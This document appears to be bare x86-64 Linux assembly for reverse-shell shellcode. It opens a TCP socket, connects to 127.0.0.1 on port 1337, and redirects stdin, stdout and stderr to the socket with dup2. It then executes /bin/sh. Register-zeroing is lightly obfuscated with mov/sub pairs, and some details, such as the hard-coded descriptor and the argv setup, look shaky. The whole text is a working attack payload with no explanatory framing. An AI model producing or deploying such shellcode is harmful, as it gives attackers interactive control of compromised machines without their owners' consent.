BITS 64
global _start

section .text
_start: 
mov rax,0x01
sub rax,0x01
xor rdi,rdi
mov rsi,0x01
sub rsi,0x01
xor rdx,rdx
mov rdx,0x01
sub rdx,0x01
mov sil,0x01
mov dil,2
sub dil,0
mov al,0x29
syscall
mov r8b,al
mov dil,r8b
xor r11,r11
push 0x0100007f
push word 0x3905
push word 0x2
mov r12,rsp
mov rsi,r12
mov dl,0x10
mov al,46
sub al,4
syscall
xor r9,r9
mov r11,r9
mov dil,0x03
mov r12,r11
mov rsi,r12
mov al,0x21
syscall
mov r11,0x01
sub r11,0x01
mov dil,0x03
mov sil,2
sub sil,1
mov al,0x21
syscall;
xor r10,r10
mov r11,r10
mov dil,0x03
mov sil,12
sub sil,10
mov al,0x21
syscall;
xor r10,r10
mov rax,r10
xor rdi,rdi
xor r14,r14
mov rsi,r14
xor r13,r13
mov r8b,59
mov al,r8b
mov rdi,"/bin/sh"
push r13
push rdi
mov r14,rsp
mov rdi,r14
push r13
push rdi
mov r15,rsp
mov rsi,r15
xor rdx,rdx
syscall
